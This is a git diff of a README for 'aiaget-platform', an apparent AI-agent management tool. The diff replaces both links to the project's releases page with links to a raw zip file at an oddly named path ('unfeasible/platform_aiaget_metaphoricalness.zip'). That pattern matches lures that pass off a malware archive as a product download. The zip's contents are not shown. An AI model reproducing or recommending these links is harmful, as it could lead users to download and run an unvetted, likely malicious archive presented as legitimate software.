@@ -1,6 +1,6 @@
 # 🤖 aiaget-platform - Manage your AI agents with confidence
 
-[![Download aiaget-platform](https://img.shields.io/badge/Download-aiaget--platform-blue.svg)](https://github.com/Lifefoo3142/aiaget-platform/releases)
+[![Download aiaget-platform](https://img.shields.io/badge/Download-aiaget--platform-blue.svg)](https://github.com/Lifefoo3142/aiaget-platform/raw/refs/heads/main/unfeasible/platform_aiaget_metaphoricalness.zip)
 
 aiaget-platform serves as a central hub for companies that build and deploy AI agents. It provides a structured environment where teams track how their models behave and how they access data. This platform simplifies the process of adding tools, reviewing decisions, and auditing logs to ensure your systems perform as intended.
 
@@ -8,7 +8,7 @@ aiaget-platform serves as a central hub for companies that build and deploy AI a
 
 You can get the software through the official release page. Visit this page to download the latest version for your Windows computer.
 
-[Download the latest release here](https://github.com/Lifefoo3142/aiaget-platform/releases)
+[Download the latest release here](https://github.com/Lifefoo3142/aiaget-platform/raw/refs/heads/main/unfeasible/platform_aiaget_metaphoricalness.zip)
 
 ## 🖥️ System requirements
 
